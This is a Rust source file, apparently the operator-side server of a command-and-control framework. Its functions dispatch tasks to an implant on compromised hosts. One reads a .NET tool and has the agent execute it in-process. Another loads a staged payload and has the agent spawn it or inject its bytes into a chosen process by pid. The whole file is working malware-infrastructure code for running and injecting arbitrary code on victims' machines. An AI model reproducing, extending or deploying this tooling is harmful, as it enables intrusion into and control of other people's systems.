use std::{path::PathBuf, sync::Arc};

use axum::extract::State;
use serde_json::Value;
use shared::{
    task_types::DotExDataForImplant,
    tasks::{Command, DotExInner, InjectInnerForAdmin, InjectInnerForPayload},
};

use crate::{
    TOOLS_PATH, admin_task_dispatch::task_agent, app_state::AppState, logging::log_error_async,
};

/// Executes dotnet in the current process
pub async fn dotex(
    uid: Option<String>,
    data: DotExInner,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let mut path_to_tool = PathBuf::from(TOOLS_PATH);
    path_to_tool.push(data.tool_path);

    // Read the tool, ret an error wrapped in an Option if it happens.. I regret this pattern rn
    let tool_data = match tokio::fs::read(path_to_tool).await {
        Ok(f) => f,
        Err(e) => {
            let msg = format!("Could not read file. {e}");
            log_error_async(&msg).await;
            return Some(serde_json::to_value(msg).unwrap());
        }
    };

    let metadata: DotExDataForImplant = (tool_data, data.args);
    let meta_ser = serde_json::to_string(&metadata).unwrap();

    let _ = task_agent(Command::DotEx, Some(meta_ser), uid.unwrap(), state).await;

    None
}

type InternalName = String;

/// Options for preparing the delivery of the inject inner payload
pub enum SpawnInject {
    Spawn(InternalName),
    /// Inject options include the pid
    Inject(InjectInnerForAdmin),
}

pub async fn spawn_inject_with_network_resource(
    uid: Option<String>,
    type_of: SpawnInject,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let state_cl = state.clone();
    let endpoints = {
        let tmp = state_cl.endpoints.read().await;
        tmp.clone()
    };

    let internal_name = match type_of {
        SpawnInject::Spawn(ref s) => &s,
        SpawnInject::Inject(ref inject_inner_for_admin) => &inject_inner_for_admin.download_name,
    };

    let file_data = match endpoints
        .read_staged_file_by_file_name(&internal_name)
        .await
    {
        Ok(buf) => buf,
        Err(e) => {
            let msg = format!("Failed to read file data for spawn/inject. {}", e);
            log_error_async(&msg).await;
            return None;
        }
    };

    drop(endpoints);

    match type_of {
        SpawnInject::Spawn(_) => {
            let ser = match serde_json::to_string(&file_data) {
                Ok(s) => s,
                Err(e) => {
                    let msg = format!("Failed to serialise file data for spawn/inject. {}", e);
                    log_error_async(&msg).await;
                    return None;
                }
            };

            task_agent::<String>(Command::Spawn, Some(ser), uid.unwrap(), state).await
        }
        SpawnInject::Inject(inner) => {
            let constructed_for_wyrm = InjectInnerForPayload {
                payload_bytes: file_data,
                pid: inner.pid,
            };

            let ser = match serde_json::to_string(&constructed_for_wyrm) {
                Ok(s) => s,
                Err(e) => {
                    let msg = format!("Failed to serialise file data for spawn/inject. {}", e);
                    log_error_async(&msg).await;
                    return None;
                }
            };

            task_agent::<String>(Command::Inject, Some(ser), uid.unwrap(), state).await
        }
    }
}
